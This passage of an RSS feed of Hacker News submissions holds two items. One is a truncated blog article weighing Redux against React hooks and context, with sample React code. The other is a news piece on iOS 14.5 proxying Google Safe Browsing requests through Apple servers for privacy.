</span><span>&lt;</span><span>/</span><span>UserContext</span><span>.</span><span>Consumer</span><span>&gt;</span><span></span></p><p><span>23</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>24</span><span></span><span>}</span><span>;</span></p></pre></div><p>At ReactConf in 2018, now React Core team member Dan Abramov and boss Sophie Alpert <a href="https://www.youtube.com/watch?v=V-QO-KO90iQ&amp;t=5s" target="_blank" rel="noreferrer">introduced a new feature</a> in React - hooks. Hooks made using state and side effects much easier, and made away with the need for class components altogether. In addition, the context API was suddenly much easier to consume, which made it much more user friendly. Here’s the revised code example with hooks:</p><div><pre><p><span>1</span><span>const</span><span> </span><span>UserContext</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>createContext</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span></span><span>const</span><span> </span><span>useUser</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>  </span><span>const</span><span> </span><span>[</span><span>user</span><span>,</span><span> setUser</span><span>]</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>React</span><span>.</span><span>useEffect</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>    myApi</span><span>.</span><span>getUser</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>user</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>setUser</span><span>(</span><span>user</span><span>)</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span>  </span><span>}</span><span>,</span><span> </span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span><span></span></p><p><span>8</span><span></span><span>const</span><span> </span><span>MyApp</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>  </span><span>const</span><span> user </span><span>=</span><span> </span><span>useUser</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>11</span><span>    </span><span>&lt;</span><span>UserContext</span><span>.</span><span>Provider</span><span> value</span><span>=</span><span>{</span><span>user</span><span>}</span><span>&gt;</span><span></span></p><p><span>12</span><span>      </span><span>&lt;</span><span>SomeDeepHierarchy</span><span> </span><span>/</span><span>&gt;</span><span></span></p><p><span>13</span><span>    </span><span>&lt;</span><span>/</span><span>UserContext</span><span>.</span><span>Provider</span><span>&gt;</span><span></span></p><p><span>14</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>15</span><span></span><span>}</span><span>;</span><span></span></p><p><span>16</span><span></span><span>const</span><span> </span><span>UserGreeting</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>17</span><span>  </span><span>const</span><span> user </span><span>=</span><span> </span><span>React</span><span>.</span><span>useContext</span><span>(</span><span>UserContext</span><span>)</span><span>;</span><span></span></p><p><span>18</span><span>  </span><span>return</span><span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Hello</span><span> there</span><span>,</span><span> </span><span>{</span><span>user</span><span>?</span><span>.</span><span>name</span><span> </span><span>?</span><span>?</span><span> </span><span>"customer"</span><span>}</span><span>!</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span>;</span><span></span></p><p><span>19</span><span></span><span>}</span><span>;</span></p></pre></div><p>With these new features landing in React, the trade-offs for using Redux changed quite a bit. The elegance of reducers were suddenly built into React itself, and prop-drilling was a solved challenge. New projects were started without having Redux in the stack - a previous no-brainer - and more and more projects started to consider moving away from Redux altogether.</p><p>As a response, the team currently maintaining Redux (led by a gentleman named Mark Eriksson) started two different efforts. They introduced an opinionated toolkit named <a href="https://redux-toolkit.js.org/" target="_blank" rel="noreferrer">Redux Toolkit</a> that did away with most boilerplate code through conventions, and they added a <a href="https://react-redux.js.org/api/hooks" target="_blank" rel="noreferrer">hooks-based API</a> for reading state and dispatching actions.</p><p>Together these two new updates simplified Redux codebases substantially. But is it really enough to defend introducing the added complexity of the concepts in Redux to a new project? Is the value Redux adds more than the added cost of teaching new employees about Yet Another Tool?</p><p>Let’s look at where React does a great job by itself, and in what cases the tradeoff of complexity vs power is worth it.</p><h2 id="when-react-is-enough">When React is enough</h2><p>Most React applications I’ve worked with have been pretty small in scope. They’ve had a few global pieces of state that was used across the application, and some data that was shared across a few different views.</p><p>Besides from this though, many React applications don’t have a lot of shared state. Most state  like the content of input fields or whether a modal is open, is only interesting to the component that contains them! No need to make that state globally available. </p><p>Other pieces of state might be shared, but only by a part of the application. Perhaps a particular page requires a piece of state to be shared across several of its components, or a sidebar needs to expose some remote status to all of its children. Either way, that’s not global state - it’s state scoped to a part of the application.</p><p>By keeping state co-located, or as close to its dependents as possible, you ensure that it’s deleted whenever the feature requiring it is deleted, and that it’s discoverable without leafing through tens of different reducers.</p><p>If you need to share app-wide settings that rarely change, React’s context API is a great tool to reach for. One example of this is what locale is currently active:</p><div><pre><p><span>1</span><span>const</span><span> </span><span>LocaleContext</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>createContext</span><span>(</span><span>{</span><span></span></p><p><span>2</span><span>  locale</span><span>:</span><span> </span><span>"en-US"</span><span>,</span><span></span></p><p><span>3</span><span>  </span><span>setLocale</span><span>:</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>}</span><span>,</span><span></span></p><p><span>4</span><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span></span><span>const</span><span> </span><span>LocaleProvider</span><span> </span><span>=</span><span> </span><span>(</span><span>props</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>  </span><span>const</span><span> </span><span>[</span><span>locale</span><span>,</span><span> setLocale</span><span>]</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>useState</span><span>(</span><span>"en-US"</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span>  </span><span>return</span><span> </span><span>&lt;</span><span>LocaleContext</span><span>.</span><span>Provider</span><span> value</span><span>=</span><span>{</span><span>{</span><span> locale</span><span>,</span><span> setLocale </span><span>}</span><span>}</span><span> </span><span>{</span><span>...</span><span>props</span><span>}</span><span> </span><span>/</span><span>&gt;</span><span>;</span><span></span></p><p><span>8</span><span></span><span>}</span><span>;</span><span></span></p><p><span>9</span><span></span><span>const</span><span> </span><span>useLocale</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>React</span><span>.</span><span>useContext</span><span>(</span><span>LocaleContext</span><span>)</span><span>;</span></p></pre></div><p>Other use cases can be what color theme is active, or even what experiments are active for a given user.</p><p>Another very useful approach is using a small data-fetching library like <a href="https://swr.vercel.app/" target="_blank" rel="noreferrer">SWR</a> or <a href="https://react-query.tanstack.com/" target="_blank" rel="noreferrer">React-Query</a> to handle fetching and caching your API responses for you. To me, cached data isn’t really global state - it’s just cached data. This is much simpler to handle with these small single-use libraries, than introducing async thunks or sagas to your Redux rig. Also, you don’t have to handle all the complex variations of isLoading, hasError and what not. With these libraries, it works out of the box.</p><p>A thing these context use cases have in common is the fact that they represent data that rarely updates. Rarely in the context of computer science is a bit vague, but in my mind, less than a couple of times every second is pretty rare. And as it turns out, that’s the way the React Context API works best!</p><p>The use cases summarized above covers most of the situations I’ve met in real world applications. Actual global state is rare and far between, and is often better off being co-located with the code that actually uses it, or provided through the context API.</p><h2 id="situations-where-redux-might-be-warranted">Situations where Redux might be warranted</h2><p>With all that said, Redux is still a great product. It’s well documented, adopted by many, and can be combined with the approaches posted above. But what use cases warrants the added complexity and learning curve of adding Redux to your stack in 2021?</p><p>One of the use cases I see most in the projects I’m involved with is when you have advanced data fetching scenarios that requires a lot of cascading network communication. One might argue that this is best done on the server side, but there are definitely use cases where handing this on the client is warranted. Redux, particularly in combination with so-called thunks, is extremely versatile and flexible when it comes to such orchestration.</p><p>Another use case is for very interdependent states, or states that are derived from several other states. This is possible to handle in React as well, but the end result is still much easier to both share, reuse and reason about in Redux.</p><p>A third use case is for those where the state of your application can change very rapidly. The lead architect of React, Seb Markbåge, stated a few years ago that the current …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/is-redux-dead">https://blog.asayer.io/is-redux-dead</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/is-redux-dead</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111098</guid>
            <pubDate>Fri, 12 Feb 2021 05:53:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple redirects Google Safe Browsing traffic through proxy servers in iOS 14.5]]>
            </title>
            <description>
<![CDATA[
Score 379 | Comments 258 (<a href="https://news.ycombinator.com/item?id=26110928">thread link</a>) | @CharlesW
<br/>
February 11, 2021 | https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><strong>Update 1:58 AM PT:</strong> <em>Updated the post to clear confusion about how Google’s Safe Browsing feature works.</em></p>
<hr>
<p>Apple’s privacy push is much more widespread than it seems at the surface. A perfect example is the new privacy feature in <a href="https://the8-bit.com/ios-14-5-changes/">iOS 14.5 Beta 1 (V2)</a> which redirects Google Safe Browsing traffic through Apple’s own proxy servers to enhance users’ privacy and to not let Google see your IP address. </p>
<p>Google Safe Browsing is a security service created by Google that checks whether a website is malicious. When you access a website on the desktop version of Chrome on your Mac or PC, for instance, Google Safe Browsing checks if a website is safe to browse and displays a warning accordingly. The user ultimately has the choice, however.</p>
<p>As Reddit user u/jaydenkieran explains, Apple uses Google Safe Browsing when you enable “Fraudulent Website Warning” within the Safari settings in the Settings app on iPhone or iPad.</p>
<p><a aria-label="According to Google (opens in a new tab)" href="https://support.google.com/transparencyreport/answer/7380435?hl=en#zippy=%2Chow-do-you-determine-that-a-site-is-unsafe" target="_blank" rel="noreferrer noopener">According to Google</a>, its Safe Browsing system works by scanning sections of Google’s web index and “identifying potentially compromised websites.” Then, Google tests those websites by using a virtual machine to check if the website compromises the system. If it does, it’s added to Google’s online database. Google also identifies phishing websites by using statistical models. </p>
<p><a aria-label="According to Apple (opens in a new tab)" href="https://support.apple.com/en-ae/HT210675" target="_blank" rel="noreferrer noopener">According to Apple</a>, before visiting a website, Safari may send hashed prefixes of the URL (Apple terms it “information calculated from the website address”) to Google Safe Browsing to check if there’s a match. </p>
<p>Since Apple uses a hashed prefix, Google cannot learn which website the user is trying to visit. Up until iOS 14.5, Google could also see the IP address of where that request is coming from. However, since Apple now proxies Google Safe Browsing traffic, it further safeguards users’ privacy while browsing using Safari.</p>
<p>Apple has been intensifying its push for privacy with iOS 14 what with the <a href="https://the8-bit.com/app-tracking-transparency-guide/">App Tracking Transparency update and the inclusion of App Privacy Reports in the App Store</a>. </p><div><p>See also</p><div id="block-wrap-39225" data-id="39225" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/siri-now-allows-setting-a-default-music-streaming-service-on-ios-14-5/" title="Siri_Default_Music_App"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg" alt="Siri Default Music App" srcset="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-293x293.jpg 293w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>At the same time, companies like Facebook are actively opposing the Cupertino giant, accusing it of negatively affecting the advertising industry. Apple’s response has been simple: </p>
<p>“We believe that this is a simple matter of standing up for our users. Users should know when their data is being collected and shared across other apps and websites — and they should have the choice to allow that or not. App Tracking Transparency in iOS 14 does not require Facebook to change its approach to tracking users and creating targeted advertising, it simply requires they give users a choice.” </p>
<p>Google itself <a href="https://appleinsider.com/articles/21/02/04/google-still-hasnt-updated-its-ios-apps-while-pondering-android-privacy-controls" target="_blank" aria-label="had been holding off (opens in a new tab)" rel="noreferrer noopener">had been holding off</a> on updating its host of apps on the App Store due to the App Privacy Health Reports in the App Store that lets users view how an app tracks them. However, Google later disclosed that it will update its apps to include as little tracking as possible.</p>
<p>Having said that, it’s interesting to see Apple focus on enhancing user privacy as much as they can. And setting up a proxy server to filter Google Safe Browsing traffic just so Google cannot see users’ browsing activity will be a welcome move for a lot of users.</p>
</div><!-- .entry-content -->
</div></div>]]>
            </description>
            <link>https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26110928</guid>
            <pubDate>Fri, 12 Feb 2021 05:07:03 GMT</pubDate>
        </item>
    </channel>
</rss>
